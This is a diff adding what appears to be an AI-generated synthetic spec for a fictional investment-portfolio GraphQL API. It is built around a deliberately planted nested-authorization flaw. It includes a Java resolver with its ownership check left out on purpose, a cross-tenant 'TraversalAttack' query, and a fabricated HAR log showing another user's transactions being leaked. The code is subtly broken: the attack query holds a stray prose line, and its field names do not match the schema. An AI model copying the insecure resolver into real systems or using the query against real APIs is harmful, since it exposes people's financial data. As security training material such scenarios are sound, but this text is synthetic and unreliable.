@@ -1,0 +1,232 @@
+Here is the twentieth system, continuing the expanded, high-density documentation format with a focus on GraphQL architecture. We are shifting into the **Financial Services** sector, focusing on an **Investment Portfolio Management Gateway**.
+
+For the vulnerabilities, we are focusing on **Pattern 5.2 (Resolver/graph traversal injection)** combined with **Pattern 1.7 (Nested resources without parent authorization)**. This scenario demonstrates how a GraphQL resolver fails to enforce ownership on nested fields, allowing a low-privilege user to traverse the graph from their own authorized account to extract sensitive, cross-tenant financial data.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** FinEdge Investment Portfolio API
+**Document Version:** 4.0.1 (FINAL)
+**Classification:** STRICTLY CONFIDENTIAL / FINANCIAL PII & SEC COMPLIANCE SCOPE
+**Domain:** Financial Services / Wealth Management / Investment Portfolios
+
+## 1.0 Executive Summary
+FinEdge provides a unified API for retail investors and financial advisors to manage investment portfolios. The platform must handle complex relationships: a single user can own multiple portfolios, and each portfolio contains thousands of transactions and asset holdings.
+
+To efficiently serve highly interconnected data while maintaining strong access controls, the platform utilizes a centralized GraphQL API gateway (Apollo Federation). The core challenge is ensuring that every request—especially nested, graph-traversal requests—re-validates object-level authorization (BOLA) at every step, not just the root query.
+
+## 2.0 Comprehensive Network Topology & Graph Architecture
+The architecture is built on a service mesh that enforces strict tenancy separation.
+
+### 2.1 The GraphQL Ingress
+* **Edge Ingress:** All traffic hits an AWS API Gateway, which routes the single-endpoint POST request to the Apollo GraphQL Router (/graphql).
+* **Primary Router:** The Apollo Router distributes the GraphQL query plan to three core backend microservices.
+
+### 2.2 The Backend Subgraphs
+* **Portfolio Subgraph (Node.js):** Handles root queries like me.portfolios and portfolio(id: $id). It is the only service that queries the user_ownership table.
+* **Asset Subgraph (Java/Spring):** Handles queries for assets and transactions, such as Asset.transactions(filter: $filter). It is deliberately designed to accept any valid asset ID without checking ownership, relying on the parent resolver in the Portfolio Subgraph to filter the list of asset IDs before it receives them.
+
+## 3.0 Identity, JWT, and Resolver Authorization
+Authentication is based on OAuth 2.0. The JWT payload is critical for the authorization model.
+
+### 3.1 Authorization Flow
+* Users receive a JWT containing their user_id.
+* The GraphQL Router enforces BOLA only at the root level. For example, a user can only call portfolio(id: $id) if they own that specific $id.
+* The Architectural Trust Flaw: The Asset Subgraph assumes any Asset ID it receives via a nested query (portfolio { assets { transactions } }) is already authorized because it came from the trusted Portfolio Subgraph. It relies on the Portfolio Subgraph to filter the list of available Asset IDs.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Asset Subgraph was originally designed as a shared utility service for multiple tenants and lacks native ownership checks in its transaction resolver. We rely entirely on the Portfolio Subgraph to sanitize the input list. Tracked as RISK-FIN-412.*
+
+### 4.1 Vulnerability A: GraphQL Traversal Injection & Nested BOLA Bypass
+**Taxonomy Pattern:** 5.2 (Resolver/graph traversal injection) & 1.7 (Nested resources without parent authorization)
+**Sub-system:** Asset Subgraph Transaction Resolver (`/graphql` Mutation/Query)
+
+**The Deep Architectural Flaw:**
+The flaw is a failure of "Nested BOLA" (Pattern 1.7). The Asset Subgraph's transaction resolver accepts an optional assetId filter, which was intended for internal debugging.
+**Resolver Traversal Injection (Pattern 5.2):** The Asset Subgraph provides a field on the Asset type called recentTransactions. This resolver accepts an assetId as an argument. The developer assumed that the assetId would be implicitly restricted by the parent Asset object in the query.
+**Nested BOLA Flaw (Pattern 1.7):** The recentTransactions resolver executes a direct SELECT * FROM transactions WHERE asset_id = $1 on the database. It completely fails to verify that the assetId provided in the argument belongs to the user_id extracted from the JWT.
+**The Exploitation Path:**
+An attacker (User A) registers an account and obtains a valid JWT. They own Portfolio ID P-A-88192 which contains Asset IDs A-1 and A-2.
+The attacker targets a victim (User B). They guess or enumerate a high-value victim's Asset ID, A-10001.
+The attacker crafts a malicious GraphQL query that accesses their own authorized root query (me.portfolios), but then uses a nested field to inject the victim's restricted asset ID.
+The Strike: The attacker executes the query: query { me { portfolios { id, assets { recentTransactions(assetId: "A-10001") { amount, date } } } } }.
+**The Cascade:** The GraphQL engine:
+Root Query: Authenticates User A and finds their portfolios (P-A-88192).
+Traversal: The Asset Subgraph's recentTransactions resolver receives the explicitly injected A-10001 ID. Because the resolver lacks its own ownership check, it happily returns the transactions for the victim's restricted asset ID, bypassing the entire authorization model.
+***
+
+# FINEDGE INVESTMENT PLATFORM: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 3.3.0
+**Applies to Architecture:** FinEdge Investment Portfolio API v4.0.1
+
+## 5.0 Core Financial Schema (PostgreSQL)
+The database enforces the one-to-many relationship between users, portfolios, and assets. The Asset Subgraph's resolver fails because it doesn't join the tables back up to the user_ownership table.
+
+```sql
+-- 1. Portfolio Ownership (The Root Authorization Anchor)
+CREATE TABLE user_ownership (
+user_id VARCHAR(100) NOT NULL, -- JWT Subject
+portfolio_id VARCHAR(50) PRIMARY KEY
+);
+
+-- 2. Financial Assets (Restricted Objects)
+CREATE TABLE assets (
+asset_id VARCHAR(50) PRIMARY KEY, -- The target of the traversal injection
+portfolio_id VARCHAR(50) REFERENCES user_ownership(portfolio_id) NOT NULL,
+ticker VARCHAR(10),
+quantity DECIMAL(18, 8)
+);
+CREATE INDEX idx_asset_portfolio ON assets(portfolio_id);
+
+-- 3. Transaction History (The Sensitive Data Payload)
+CREATE TABLE transactions (
+tx_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+asset_id VARCHAR(50) REFERENCES assets(asset_id) NOT NULL,
+amount DECIMAL(18, 8) NOT NULL,
+type VARCHAR(10), -- BUY, SELL, DIVIDEND
+executed_date DATE
+);
+CREATE INDEX idx_tx_asset ON transactions(asset_id);
+```
+
+## 6.0 The Flawed Implementation (Java Spring Boot Resolver)
+The vulnerability lies in the specific resolver function for the Asset type. It trusts that the input has been pre-filtered by the upstream router/parent resolver, exposing a direct data path (Pattern 5.2).
+
+### 6.1 Vulnerable Asset Transaction Resolver
+```java
+package com.finedge.asset.resolvers;
+
+// ... imports ...
+
+@Component
+public class AssetResolver implements GraphQLQueryResolver {
+// VULNERABILITY 1.7 & 5.2: Resolver Traversal Injection
+// This resolver is attached to the 'Asset' type. It should enforce that the assetId is
+// either the parent object's ID OR is owned by the current user. It does NEITHER.
+public List<Transaction> recentTransactions(@Context String userId, DataFetchingEnvironment env, @Argument String assetId) {
+
+    // FLAW: Missing BOLA check. The resolver should perform:
+    // if (!db.checkAssetOwnership(userId, assetId)) { throw new AccessDeniedException() }
+
+    if (assetId == null) {
+        // Default path: intended usage (assetId comes from the parent object)
+        // Code omitted for brevity.
+    }
+
+    // VULNERABILITY: This path is the injection point. It accepts an arbitrary assetId.
+    String query = "SELECT tx_id, amount, type, executed_date FROM transactions WHERE asset_id = ?";
+
+    // Executes the query on the database
+    List<Transaction> transactions = db.executeQuery(query, assetId);
+    
+    return transactions;
+}
+}
+```
+
+## 7.0 GraphQL Schema & Malicious Query Contract (The Attack Vector)
+The GraphQL schema allows for deep nesting, which the attacker abuses by using the recentTransactions field as an injection point to pivot authorization.
+
+### 7.1 The GraphQL Schema Definition (Excerpt)
+```graphql
+type Portfolio {
+id: ID!
+assets: [Asset!]!
+}
+
+type Asset {
+id: ID!
+ticker: String!
+# The vulnerability: accepts an explicit assetId argument
+recentTransactions(assetId: ID): [Transaction!]!
+}
+
+type Transaction {
+amount: Float!
+date: String!
+# ... sensitive financial details
+}
+```
+
+### 7.2 The Malicious Traversal Query (Pattern 5.2 - Traversal Injection)
+The attacker uses their own authorized root query (me) to gain entry into the GraphQL server, then injects a restricted ID into a nested field argument.
+
+```graphql
+query TraversalAttack {Root Query: Authorized access (User A's details)
+
+me {
+portfolios {
+id
+# Nested Query: Injecting the victim's asset ID (A-10001)
+assets {
+recentTransactions(assetId: "A-10001") {
+amount
+type
+executedDate
+}
+}
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL TRAVERSAL INJECTION (HAR TRACE)
+**Applies to Architecture:** FinEdge Investment Portfolio API v4.0.1
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.2 & Pattern 1.7)
+
+This HTTP Archive (HAR) trace captures the moment User A (`user_id: "u-88192A"`) executes a GraphQL Traversal Injection. The attacker submits a single HTTP POST request to the /graphql endpoint. The request is correctly authenticated, but the payload contains a nested recentTransactions query that explicitly forces the resolver to fetch data for Asset ID A-10001, which belongs to another tenant.
+
+The backend API accepts the query, executes the data extraction, and returns the victim's sensitive transaction history with a 200 OK response, confirming the BOLA bypass via graph traversal.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo GraphQL Router Logs",
+"version": "2.1.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T15:15:30.100Z",
+"time": 95,
+"request": {
+"method": "POST",
+"url": "https://api.finedge.invest/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.finedge.invest" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1LTg4MTkyQSJ9..." },
+{ "name": "content-type", "value": "application/json" },
+{ "name": "user-agent", "value": "GraphQL-Attacker/1.0" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query TraversalAttack { me { portfolios { id assets { recentTransactions(assetId: \\\"A-10001\\\") { amount type executedDate } } } } }\"}"
+},
+"bodySize": 185
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-federation-latency-ms", "value": "45" }
+],
+"content": {
+"size": 712,
+"mimeType": "application/json",
+"text": "{\"data\": {\"me\": {\"portfolios\": [{\"id\": \"P-A-88192\", \"assets\": [{\"recentTransactions\": [{\"amount\": 50000.00, \"type\": \"BUY\", \"executedDate\": \"2026-04-01\"}, {\"amount\": 12000.00, \"type\": \"SELL\", \"executedDate\": \"2026-04-05\"}]}]}]}}}"
+},
+"bodySize": 712
+}
+}
+]
+}
+}
+```
+
+***
